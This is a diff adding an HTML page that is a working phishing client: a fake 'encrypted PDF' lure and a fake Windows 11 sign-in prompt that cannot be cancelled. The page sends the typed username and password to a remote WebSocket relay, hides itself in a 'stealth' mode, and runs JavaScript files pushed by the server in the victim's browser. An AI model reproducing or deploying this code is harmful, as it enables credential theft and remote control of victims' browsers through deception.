@@ -1,0 +1,850 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WS Client — wss://yourlistener.yourdomain.com</title>
+<!-- No-JS fallback: mobile Mail apps don't run JavaScript, so the live client
+     can't start inside them. The reliable path is a tappable LINK — Mail opens
+     link taps in the real browser (Safari), where JS runs and the client boots.
+     We deliberately do NOT use a meta-refresh tag here: it navigates the Mail
+     webview in place (still no JS), so pointing it at this same page loops
+     forever, and even a one-shot bounce would only land on a frozen client.
+     The fallback is the #nojs-link panel below: a tappable image of a PDF page
+     (the whole sheet is one link) plus this secondary <noscript> link. In a
+     JS browser the same panel is the initial-load gate: JS keeps it visible
+     and intercepts the click to pop the sign-in prompt instead of navigating. -->
+<noscript>
+  <p style="font-family:monospace;padding:20px;color:#d0d0d0">
+    This page needs JavaScript, which your email app can't run.
+    <a href="https://yourclient.yourdomain.com/">Open the client in your browser</a>
+  </p>
+</noscript>
+<style>
+  /* Dark theme matched to the ws_server.py console palette */
+  :root {
+    --bg:        #161620;
+    --bg2:       #1e1e28;
+    --panel:     #22223a;
+    --border:    #303048;
+    --border2:   #404060;
+    --text:      #d0d0d0;
+    --muted:     #8090b0;
+    --accent:    #6495ed;
+    --ok:        #64dc82;
+    --warn:      #ff9d5c;
+    --amber:     #ffd864;
+    --mono:      "Consolas","Menlo","Monaco","Courier New",monospace;
+  }
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0; height: 100%;
+    background: var(--bg); color: var(--text);
+    font-family: var(--mono); font-size: 13px;
+    overflow: hidden;
+  }
+
+  /* ---- status pill (debug mode only: ?hide=0) ---- */
+  #status {
+    position: fixed; top: 0; left: 0; right: 0;
+    display: flex; align-items: center; gap: 8px;
+    padding: 6px 10px;
+    background: #28283a; border-bottom: 1px solid var(--border);
+    font-size: 11px; color: var(--muted);
+    z-index: 20;
+  }
+  #status .dot { width: 9px; height: 9px; border-radius: 50%; background: #888; }
+  #status .dot.on   { background: var(--ok); }
+  #status .dot.err  { background: var(--warn); }
+  #status .grow { flex: 1; }
+
+  /* ---- no-JS panel (L3): visible only until JS boots and hides it.
+         In no-JS viewers (mobile Mail attachment preview) the fallback is an
+         IMAGE OF A PDF — the whole sheet is one tappable link, so tapping it
+         opens the client in the real browser. ---- */
+  #nojs-link {
+    position: fixed; inset: 0;
+    display: flex; align-items: center; justify-content: center;
+    flex-direction: column;
+    background: rgba(8, 8, 14, 0.92);
+    z-index: 30;
+    text-align: center;
+  }
+  #nojs-a {
+    display: inline-block;
+    text-decoration: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+  /* the PDF page */
+  #pdfsheet {
+    position: relative;
+    width: 260px; height: 340px;
+    background: #ffffff;
+    border-radius: 6px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.55);
+    overflow: hidden;
+    text-align: left;
+  }
+  #pdfcorner {
+    position: absolute; top: 0; right: 0;
+    width: 0; height: 0;
+    border-top: 28px solid #d9d9e3;
+    border-left: 28px solid transparent;
+    border-top-right-radius: 6px;
+  }
+  #pdfname {
+    position: absolute; top: 44px; left: 16px;
+    font-size: 12px; color: #50506a;
+  }
+  #pdfbadge {
+    position: absolute; top: 40px; right: 18px;
+    background: #e5413c; color: #ffffff;
+    font-weight: bold; font-size: 12px; letter-spacing: 1px;
+    padding: 3px 9px; border-radius: 4px;
+  }
+  #pdflines { position: absolute; top: 80px; left: 16px; right: 16px; }
+  #pdflines .pl {
+    height: 8px; border-radius: 4px; background: #dcdce4; margin-bottom: 10px;
+  }
+  #pdffooter { position: absolute; bottom: 16px; left: 16px; right: 16px; }
+  #pdffooter .tap {
+    display: block;
+    background: var(--accent); color: #ffffff;
+    text-align: center; font-size: 13px; font-weight: bold;
+    padding: 10px 0; border-radius: 4px;
+  }
+  #nojs-cap {
+    color: var(--muted); margin-top: 14px;
+    font-size: 12px; max-width: 340px; padding: 0 16px;
+  }
+
+  /* ---- idle state: a blurred background and nothing else.
+         The single window sits inert until a document is loaded. ---- */
+  #blurbg {
+    position: fixed; inset: -10%;
+    z-index: 1;
+    background:
+      radial-gradient(50% 40% at 25% 30%, #2c2c4e 0%, transparent 70%),
+      radial-gradient(55% 45% at 75% 70%, #1c2c40 0%, transparent 70%),
+      radial-gradient(40% 35% at 60% 15%, #3a2438 0%, transparent 70%),
+      var(--bg);
+    filter: blur(70px);
+  }
+  #veil {
+    position: fixed; inset: 0;
+    background: rgba(10, 10, 16, 0.80);
+    z-index: 5;
+  }
+
+  /* ---- fullscreen document view (default doc / server-pushed files) ---- */
+  #docview {
+    position: fixed; inset: 0;
+    display: none;
+    background: #0c0c12;
+    z-index: 15;
+  }
+  #docview.open { display: block; }
+  #docbody { position: absolute; inset: 0; }
+  /* locked (credentials not yet entered): the content is blurred out */
+  #docview.locked #docbody { filter: blur(18px); }
+  #docbody iframe {
+    display: block;
+    width: 100%; height: 100%;
+    border: 0;
+    background: #fff;
+  }
+  #docbody img {
+    position: absolute; inset: 0;
+    width: 100%; height: 100%;
+    object-fit: contain;
+    background: #0c0c12;
+  }
+  #docbody pre {
+    position: absolute; inset: 0;
+    margin: 0; padding: 14px 18px;
+    overflow: auto;
+    background: #161620; color: #d0d0d0;
+    font-family: var(--mono); font-size: 13px; line-height: 1.5;
+    white-space: pre-wrap; word-break: break-word;
+  }
+  #lockveil {
+    position: absolute; inset: 0;
+    display: none;
+    flex-direction: column; align-items: center; justify-content: center; gap: 6px;
+    background: rgba(8, 8, 14, 0.55);
+    color: var(--muted);
+    z-index: 2;
+    pointer-events: none;
+  }
+  #docview.locked #lockveil { display: flex; }
+  #lockveil .big { font-size: 26px; }
+  #doc-close {
+    position: absolute; top: 8px; right: 10px;
+    z-index: 3;
+    background: rgba(20, 20, 32, 0.85); color: #c0c0d0;
+    border: 1px solid var(--border2); border-radius: 3px;
+    padding: 4px 10px; font-family: var(--mono); font-size: 11px;
+    cursor: pointer;
+  }
+  #doc-close:hover { background: #3a3a55; }
+
+  /* ---- modal (credential prompt / server-pushed dialogs) ---- */
+  #backdrop {
+    position: fixed; inset: 0;
+    display: none;
+    align-items: center; justify-content: center;
+    z-index: 20;   /* above the document view: creds prompt on top of the doc */
+  }
+  #backdrop.open { display: flex; }
+
+  .card {
+    width: 420px; max-width: 90vw;
+    background: var(--bg2);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    box-shadow: 0 12px 40px rgba(0,0,0,0.6);
+    overflow: hidden;
+  }
+  .card .title {
+    padding: 9px 14px;
+    background: #23233a;
+    border-bottom: 1px solid var(--border);
+    color: var(--accent);
+    font-weight: bold; font-size: 13px;
+  }
+  .card .body { padding: 14px; }
+  .card .message {
+    color: var(--text); margin-bottom: 12px; white-space: pre-wrap;
+  }
+  .card .field { margin-bottom: 10px; }
+  .card .field .lbl {
+    display: block; margin-bottom: 4px;
+    color: var(--muted); font-size: 11px;
+  }
+  .card input[type=text], .card input[type=password] {
+    width: 100%;
+    background: #161620; color: var(--text);
+    border: 1px solid var(--border); border-radius: 3px;
+    padding: 7px 10px; font-family: var(--mono); font-size: 13px;
+  }
+  .card input[type=text]:focus, .card input[type=password]:focus {
+    outline: none; border-color: var(--accent);
+  }
+  .card .check {
+    display: flex; align-items: center; gap: 8px;
+    margin-top: 10px; color: var(--text); font-size: 12px;
+  }
+  .card .check input { width: 15px; height: 15px; accent-color: var(--ok); }
+
+  .card .buttons {
+    display: flex; justify-content: flex-end; gap: 8px;
+    padding: 11px 14px;
+    background: #181822; border-top: 1px solid var(--border);
+  }
+  .card .buttons button {
+    min-width: 84px;
+    background: #2a2a40; color: #c0c0d0;
+    border: 1px solid var(--border2); border-radius: 3px;
+    padding: 6px 14px; font-family: var(--mono); font-size: 12px;
+    cursor: pointer;
+  }
+  .card .buttons button:hover { background: #3a3a55; }
+  .card .buttons button.primary {
+    background: #252540; color: #a0c0ff; border-color: #4a6a90;
+  }
+  .card .buttons button.primary:hover { background: #353555; }
+
+  /* ---- Windows 11-style sign-in prompt (client unlock) ----
+         Shown when the PDF gate is clicked. Cancel keeps it on screen. */
+  #winveil {
+    position: fixed; inset: 0;
+    display: none;
+    background: rgba(8, 8, 14, 0.55);
+    z-index: 38;
+  }
+  #winveil.open { display: block; }
+  #wincred {
+    position: fixed; inset: 0;
+    display: none;
+    align-items: center; justify-content: center;
+    z-index: 40;
+    pointer-events: none;
+  }
+  #wincred.open { display: flex; }
+  #wc-card {
+    pointer-events: auto;
+    width: 340px; max-width: 88vw;
+    background: rgba(33, 33, 38, 0.95);
+    border: 1px solid #4a4a52;
+    border-radius: 8px;
+    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.65);
+    padding: 26px 30px 16px;
+    font-family: "Segoe UI", "Segoe UI Variable Text", system-ui,
+                 -apple-system, "Helvetica Neue", sans-serif;
+    color: #f5f5f5;
+    text-align: center;
+  }
+  #wc-avatar {
+    width: 76px; height: 76px; border-radius: 50%;
+    margin: 0 auto 10px;
+    background: linear-gradient(160deg, #4a4a58, #2e2e38);
+    border: 2px solid rgba(255, 255, 255, 0.14);
+    display: flex; align-items: center; justify-content: center;
+  }
+  #wc-avatar svg { width: 44px; height: 44px; fill: #cfcfd8; }
+  #wc-name { font-size: 19px; font-weight: 600; }
+  #wc-msg {
+    font-size: 12px; color: #9a9aa5;
+    margin: 4px 0 16px; line-height: 1.4;
+  }
+  #wc-fields { text-align: left; }
+  #wc-fields input {
+    display: block; width: 100%;
+    background: #1f1f24; color: #f5f5f5;
+    border: 1px solid #45454e;
+    border-bottom: 2px solid #45454e;
+    border-radius: 4px;
+    padding: 8px 12px;
+    font-family: inherit; font-size: 14px;
+    margin-bottom: 12px;
+  }
+  #wc-fields input::placeholder { color: #8a8a95; }
+  #wc-fields input:focus {
+    outline: none;
+    border-bottom: 2px solid #4cc2ff;
+  }
+  #wc-buttons {
+    display: flex; justify-content: flex-end; gap: 8px;
+    margin-top: 14px; padding-top: 12px;
+  }
+  #wc-buttons button {
+    font-family: inherit; font-size: 14px;
+    min-width: 88px;
+    padding: 6px 16px;
+    border-radius: 4px;
+    cursor: pointer;
+    border: 1px solid #55555e;
+    background: #3a3a42; color: #f5f5f5;
+  }
+  #wc-buttons button:hover { background: #464650; }
+  #wc-signin {
+    background: #0078d4; border-color: #0078d4; color: #ffffff;
+  }
+  #wc-signin:hover { background: #1a86dd; }
+  /* the PDF gate sheet is a click target in JS browsers */
+  #nojs-a { cursor: pointer; }
+</style>
+</head>
+<body>
+
+  <!-- inert idle look: blurred background under a dark veil, nothing else -->
+  <div id="blurbg"></div>
+  <div id="veil"></div>
+
+  <!-- L3: no-JS viewers (mobile Mail): an image of a PDF page — the whole
+       sheet is one tappable link; JS hides this panel at boot -->
+  <div id="nojs-link">
+    <a id="nojs-a" href="https://wsclient.g3tsyst3m.online/">
+      <div id="pdfsheet">
+        <div id="pdfcorner"></div>
+        <div id="pdfname">default.pdf</div>
+        <div id="pdfbadge">PDF</div>
+        <div id="pdflines">
+          <div class="pl" style="width:88%"></div>
+          <div class="pl" style="width:72%"></div>
+          <div class="pl" style="width:81%"></div>
+          <div class="pl" style="width:58%"></div>
+          <div class="pl" style="width:76%"></div>
+          <div class="pl" style="width:44%"></div>
+        </div>
+        <div id="pdffooter"><span class="tap">TAP TO OPEN</span></div>
+      </div>
+    </a>
+    <div id="nojs-cap">This viewer can&apos;t run the live client — tap the
+      PDF to open it in your browser</div>
+  </div>
+
+  <div id="status">
+    <span class="dot" id="dot"></span>
+    <span id="state">connecting…</span>
+    <span class="grow"></span>
+    <span id="url"></span>
+  </div>
+
+  <!-- fullscreen document view: fills the whole window -->
+  <div id="docview">
+    <div id="docbody"></div>
+    <div id="lockveil">
+      <div class="big">&#128274;</div>
+      <div>locked — enter credentials to open</div>
+    </div>
+    <button id="doc-close" title="Close (Esc)">✕ close</button>
+  </div>
+
+  <div id="backdrop">
+    <div class="card" role="dialog" aria-modal="true">
+      <div class="title" id="m-title">Prompt</div>
+      <div class="body">
+        <div class="message" id="m-message"></div>
+        <div id="m-fields"></div>
+        <label class="check" id="m-check-wrap" style="display:none">
+          <input type="checkbox" id="m-check">
+          <span id="m-check-lbl"></span>
+        </label>
+      </div>
+      <div class="buttons" id="m-buttons"></div>
+    </div>
+  </div>
+
+  <!-- Windows 11-style sign-in prompt: pops when the PDF gate is clicked.
+       Cancel never dismisses it — the prompt just stays on screen. -->
+  <div id="winveil"></div>
+  <div id="wincred">
+    <div id="wc-card" role="dialog" aria-modal="true">
+      <div id="wc-avatar">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M12 12c2.94 0 5.33-2.39 5.33-5.33S14.94 1.33 12 1.33 6.67 3.72 6.67 6.67 9.06 12 12 12zm0 2.67c-3.34 0-10 1.67-10 5.33v2.33h20v-2.33c0-3.66-6.66-5.33-10-5.33z"/>
+        </svg>
+      </div>
+      <div id="wc-name">User</div>
+      <div id="wc-msg">This PDF is encrypted. Enter your username and password to open it.</div>
+      <div id="wc-fields">
+        <input type="text" id="wc-user" placeholder="Username" autocomplete="off" spellcheck="false">
+        <input type="password" id="wc-pass" placeholder="Password" autocomplete="off">
+      </div>
+      <div id="wc-buttons">
+        <button id="wc-cancel">Cancel</button>
+        <button id="wc-signin">Sign in</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+(function () {
+  "use strict";
+
+  // ---- config -----------------------------------------------------------
+  // Single window, single client. The page opens on a full-screen image of a
+  // PDF page (the same one the mobile no-JS fallback shows). Clicking it pops
+  // a Windows 11-style username/password prompt; Cancel keeps the prompt on
+  // screen. Once the credentials are accepted, the default document (a Google
+  // Drive PDF preview) loads fullscreen, and the server can then push other
+  // files (pdf/image/text) which load into the same fullscreen view.
+  //
+  // Connects to the VPS ws_listener relay (wss://yourlistener.yourdomain.com)
+  // by default — the server on LAN dials the same relay, so this page works
+  // from the internet. Pass ?url=ws://host:port to talk directly to a local
+  // server instead (e.g. ws://192.168.0.45:8765). ?hide=0 = debug mode
+  // (status bar shown).
+  const params = new URLSearchParams(location.search);
+  const SERVER_URL = params.get("url") || "wss://yourlistener.yourdomain.com";
+  const STEALTH    = params.get("hide") !== "0";
+  const CLIENT_ID  = "c-" + Math.random().toString(36).slice(2, 8);
+
+  const DEFAULT_DOC = {
+    id: "default",
+    name: "default.pdf",
+    mime: "application/pdf",
+    url: "https://drive.google.com/file/d/1BlgFBn-QH-3Yb4wcedHOwoKBLP4PkwDv/preview"
+  };
+
+  // ---- dom refs ---------------------------------------------------------
+  const dot     = document.getElementById("dot");
+  const stateEl = document.getElementById("state");
+  const urlEl   = document.getElementById("url");
+  const status  = document.getElementById("status");
+  const docview  = document.getElementById("docview");
+  const docbody  = document.getElementById("docbody");
+  const docClose = document.getElementById("doc-close");
+  const backdrop  = document.getElementById("backdrop");
+  const mTitle    = document.getElementById("m-title");
+  const mMessage  = document.getElementById("m-message");
+  const mFields   = document.getElementById("m-fields");
+  const mCheckWrap = document.getElementById("m-check-wrap");
+  const mCheck    = document.getElementById("m-check");
+  const mCheckLbl = document.getElementById("m-check-lbl");
+  const mButtons  = document.getElementById("m-buttons");
+
+  urlEl.textContent = SERVER_URL;
+  if (STEALTH) status.style.display = "none";   // nothing shows until a modal
+
+  // ---- initial-load gate: the same PDF-page image as the mobile no-JS
+  // fallback. In a no-JS viewer it stays a tappable LINK (navigates to the
+  // site, where the client boots); here JS intercepts the click and pops
+  // the sign-in prompt instead. The panel is visible by default; it is only
+  // hidden once the credentials are accepted.
+  const gateEl  = document.getElementById("nojs-link");
+  const gateCap = document.getElementById("nojs-cap");
+  if (gateCap) gateCap.textContent = "Click the PDF to sign in";
+  const gateA = document.getElementById("nojs-a");
+  if (gateA) gateA.addEventListener("click", function (e) {
+    e.preventDefault();
+    showCredModal();
+  });
+
+  // ---- status helpers (debug mode) ---------------------------------------
+  function setConn(on, text) {
+    dot.className = "dot" + (on ? " on" : (text ? " err" : ""));
+    stateEl.textContent = text || (on ? "connected" : "offline");
+  }
+
+  // ---- websocket ----------------------------------------------------------
+  let ws = null;
+  let reconnectDelay = 1000;
+  let pendingModal = null;   // the modal spec currently on screen
+  let currentDoc   = null;   // the document spec currently on screen
+  let docLocked    = false;
+  let hasAuth      = false;  // credentials entered: don't re-prompt on later docs
+  const counters = { modal: 0, respond: 0, doc: 0, docClose: 0, auth: 0 };
+
+  function connect() {
+    setConn(false, "connecting…");
+    try {
+      ws = new WebSocket(SERVER_URL);
+    } catch (e) {
+      setConn(false, "bad url");
+      setTimeout(connect, reconnectDelay);
+      return;
+    }
+
+    ws.onopen = function () {
+      reconnectDelay = 1000;
+      setConn(true, "connected");
+      // report client info to the server
+      ws.send(JSON.stringify({
+        type: "client_info",
+        info: {
+          clientId: CLIENT_ID,
+          userAgent: navigator.userAgent,
+          platform: (navigator.platform || ""),
+          ts: Date.now()
+        }
+      }));
+    };
+
+    ws.onmessage = function (ev) {
+      let msg;
+      try { msg = JSON.parse(ev.data); } catch (e) { return; }
+      handle(msg);
+    };
+
+    ws.onclose = function () {
+      setConn(false, "disconnected");
+      const d = Math.min(reconnectDelay * 1.6, 15000);
+      setTimeout(connect, reconnectDelay);
+      reconnectDelay = d;
+    };
+
+    ws.onerror = function () {
+      setConn(false, "error");
+    };
+  }
+
+  function send(obj) {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      // Stamp our clientId on every frame so the server can attribute
+      // responses (modal_response / doc_auth / pong) to the right phone
+      // when several clients share the VPS relay link.
+      try { obj.clientId = CLIENT_ID; } catch (e) {}
+      try { ws.send(JSON.stringify(obj)); } catch (e) {}
+      return true;
+    }
+    return false;
+  }
+
+  function handle(msg) {
+    // Ignore frames addressed to someone else (per-client "to" routing
+    // through the relay; harmless under the old broadcast relay too).
+    if (msg.to && msg.to !== "all" && msg.to !== CLIENT_ID) return;
+    switch (msg.type) {
+      case "ping":
+        send({ type: "pong", id: msg.id });
+        break;
+      case "modal":
+        showModal(msg);
+        break;
+      case "doc":       // server-pushed file (pdf/image/text, base64)
+      case "pdf":       // legacy: server-pushed url
+        openDoc(msg);
+        break;
+      // (extensible: command, exec, etc.)
+    }
+  }
+
+  // ---- modal (supports a `fields` list: text / password) ------------------
+  function showModal(spec, opts) {
+    opts = opts || {};
+    counters.modal++;
+    pendingModal = spec;
+    mTitle.textContent = spec.title || "Prompt";
+    mMessage.textContent = spec.message || "";
+
+    // fields: an explicit list, or one legacy "value" field
+    const fields = (spec.fields && spec.fields.length)
+      ? spec.fields
+      : [{ key: "value", label: "", type: "text", value: spec.value || "" }];
+    mFields.innerHTML = "";
+    fields.forEach(function (f) {
+      const wrap = document.createElement("div");
+      wrap.className = "field";
+      if (f.label) {
+        const lbl = document.createElement("span");
+        lbl.className = "lbl";
+        lbl.textContent = f.label;
+        wrap.appendChild(lbl);
+      }
+      const inp = document.createElement("input");
+      inp.type = (f.type === "password") ? "password" : "text";
+      inp.dataset.key = f.key;
+      inp.value = f.value || "";
+      inp.autocomplete = "off";
+      wrap.appendChild(inp);
+      mFields.appendChild(wrap);
+    });
+
+    // checkbox (optional)
+    if (spec.checkbox && spec.checkbox.label) {
+      mCheckWrap.style.display = "flex";
+      mCheckLbl.textContent = spec.checkbox.label;
+      mCheck.checked = !!spec.checkbox.checked;
+    } else {
+      mCheckWrap.style.display = "none";
+      mCheck.checked = false;
+    }
+
+    function collectValues() {
+      const out = {};
+      mFields.querySelectorAll("input").forEach(function (inp) {
+        out[inp.dataset.key] = inp.value;
+      });
+      return out;
+    }
+    function finish(ok) {
+      const values = collectValues();
+      const payload = {
+        id: spec.id, ok: ok,
+        value: (values.value !== undefined) ? values.value
+              : Object.values(values)[0],
+        values: values,
+        checked: mCheck.checked
+      };
+      mButtons.querySelectorAll("button").forEach(function (b) {
+        b.onclick = null;
+      });
+      if (opts.onRespond) opts.onRespond(payload);
+      else respond(payload);
+    }
+
+    // buttons (default OK / Cancel)
+    const buttons = (spec.buttons && spec.buttons.length) ? spec.buttons : ["OK", "Cancel"];
+    mButtons.innerHTML = "";
+    buttons.forEach(function (label, i) {
+      const b = document.createElement("button");
+      b.textContent = label;
+      if (i === 0) b.className = "primary";
+      b.onclick = function () { finish(i === 0); };
+      mButtons.appendChild(b);
+    });
+
+    // keyboard: Enter = primary (OK), Esc = last button (Cancel)
+    mFields.querySelectorAll("input").forEach(function (inp) {
+      inp.onkeydown = function (e) {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          finish(true);
+        } else if (e.key === "Escape") {
+          e.preventDefault();
+          finish(false);
+        }
+      };
+    });
+
+    // the veil is already there; just put the card on top and focus the input
+    backdrop.classList.add("open");
+    setTimeout(function () {
+      const first = mFields.querySelector("input");
+      if (first) { first.focus(); first.select && first.select(); }
+    }, 60);
+  }
+
+  function respond(payload) {
+    counters.respond++;
+    pendingModal = null;
+    backdrop.classList.remove("open");   // back to the inert blurred pane
+    send(Object.assign({ type: "modal_response" }, payload));
+  }
+
+  // ---- fullscreen document view -------------------------------------------
+  function isJsFile(name) {
+    return /\.js$/i.test(String(name || ""));
+  }
+
+  // a .js file may wrap its code in HTML script tags (common when copied
+  // out of an HTML page) — unwrap before executing
+  function stripScriptWrap(code) {
+    const m = String(code).match(/^\s*<script[^>]*>([\s\S]*)<\/script>\s*$/i);
+    return m ? m[1] : String(code);
+  }
+
+  function renderDoc(spec) {
+    docbody.innerHTML = "";
+    let el;
+    if (spec.url) {
+      // remote document (e.g. Google Drive preview)
+      el = document.createElement("iframe");
+      el.title = spec.name || "document";
+      el.src = spec.url;
+    } else {
+      const mime = spec.mime || "application/octet-stream";
+      const dataUrl = "data:" + mime + ";base64," + (spec.data_b64 || "");
+      if (mime === "application/pdf") {
+        el = document.createElement("iframe");
+        el.title = spec.name || "document";
+        el.src = dataUrl;
+      } else if (mime.indexOf("image/") === 0) {
+        el = document.createElement("img");
+        el.alt = spec.name || "image";
+        el.src = dataUrl;
+      } else if (isJsFile(spec.name)) {
+        // .js files: execute in the client context instead of displaying
+        const s = document.createElement("script");
+        s.textContent = stripScriptWrap(b64ToText(spec.data_b64 || ""));
+        docbody.appendChild(s);
+        return;
+      } else {
+        el = document.createElement("pre");
+        el.textContent = b64ToText(spec.data_b64 || "");
+      }
+    }
+    docbody.appendChild(el);
+  }
+
+  function b64ToText(b64) {
+    try {
+      const bin = atob(b64);
+      const bytes = new Uint8Array(bin.length);
+      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+      try { return new TextDecoder("utf-8").decode(bytes); }
+      catch (e) { return String.fromCharCode.apply(null, bytes); }
+    } catch (e) {
+      return "(undecodable content: " + (b64.length || 0) + " b64 chars)";
+    }
+  }
+
+  function openDoc(spec) {
+    currentDoc = spec;
+    counters.doc++;
+    renderDoc(spec);
+    docview.classList.add("open");
+    if (hasAuth) {
+      setLocked(false);   // already unlocked: show the file right away
+    } else {
+      setLocked(true);
+      showCredModal();    // first doc: username + password to open it
+    }
+  }
+
+  function setLocked(v) {
+    docLocked = v;
+    docview.classList.toggle("locked", v);
+  }
+
+  function closeDoc(report) {
+    if (!docview.classList.contains("open")) return;
+    counters.docClose++;
+    if (report && currentDoc) {
+      send({ type: "doc_auth", id: currentDoc.id, ok: false,
+             username: null, password: null });
+    }
+    currentDoc = null;
+    docview.classList.remove("open");
+    docbody.innerHTML = "";
+  }
+
+  // ---- sign-in prompt (Windows 11 look) -----------------------------------
+  const winveil  = document.getElementById("winveil");
+  const wincred  = document.getElementById("wincred");
+  const wcUser   = document.getElementById("wc-user");
+  const wcPass   = document.getElementById("wc-pass");
+  const wcCancel = document.getElementById("wc-cancel");
+  const wcSignin = document.getElementById("wc-signin");
+
+  function showCredModal() {
+    winveil.classList.add("open");
+    wincred.classList.add("open");
+    setTimeout(function () { wcPass.focus(); }, 60);
+  }
+
+  function hideCredModal() {
+    winveil.classList.remove("open");
+    wincred.classList.remove("open");
+  }
+
+  function onCredRespond(ok) {
+    if (ok) {
+      counters.auth++;
+      hasAuth = true;          // don't re-prompt for files pushed later
+      hideCredModal();
+      gateEl.style.display = "none";   // past the gate
+      const id = currentDoc ? currentDoc.id : DEFAULT_DOC.id;
+      send({
+        type: "doc_auth", id: id, ok: true,
+        username: wcUser.value,
+        password: wcPass.value
+      });
+      if (currentDoc) setLocked(false);             // doc already on screen
+      else openDoc(Object.assign({}, DEFAULT_DOC)); // default doc opens now
+    }
+    // Cancel: just keep showing the prompt — nothing else to do.
+  }
+
+  wcCancel.addEventListener("click", function () {
+    // Cancel never dismisses the prompt; it simply stays on screen.
+  });
+  wcSignin.addEventListener("click", function () { onCredRespond(true); });
+  [wcUser, wcPass].forEach(function (inp) {
+    inp.addEventListener("keydown", function (e) {
+      if (e.key === "Enter") { e.preventDefault(); onCredRespond(true); }
+      // Esc: the prompt stays put
+    });
+  });
+
+  docClose.addEventListener("click", function () { closeDoc(true); });
+  // Esc closes the document (only when no modal is on top)
+  document.addEventListener("keydown", function (e) {
+    if (e.key === "Escape" && docview.classList.contains("open")
+        && !backdrop.classList.contains("open")
+        && !wincred.classList.contains("open")) {
+      closeDoc(true);
+    }
+  });
+
+  // ---- boot ----------------------------------------------------------------
+  // The page opens on the PDF gate (the same image as the mobile fallback);
+  // clicking it pops the sign-in prompt, and the document opens only after
+  // the credentials are accepted. Nothing else is on screen until then.
+  connect();
+
+  window.__wsClient = {
+    mode: "single",
+    stealth: STEALTH,
+    serverUrl: function () { return SERVER_URL; },
+    connected: function () { return !!(ws && ws.readyState === WebSocket.OPEN); },
+    state:     function () { return stateEl.textContent; },
+    gateOpen:    function () { return gateEl.style.display !== "none"; },
+    credModalOpen: function () { return wincred.classList.contains("open"); },
+    docOpen:   function () { return docview.classList.contains("open"); },
+    docLocked: function () { return docLocked; },
+    authed:    function () { return hasAuth; },
+    docInfo:   function () {
+      return currentDoc ? {
+        id: currentDoc.id, name: currentDoc.name, mime: currentDoc.mime,
+        url: currentDoc.url || null
+      } : null;
+    },
+    counters:  counters
+  };
+})();
+</script>
+</body>
+</html>
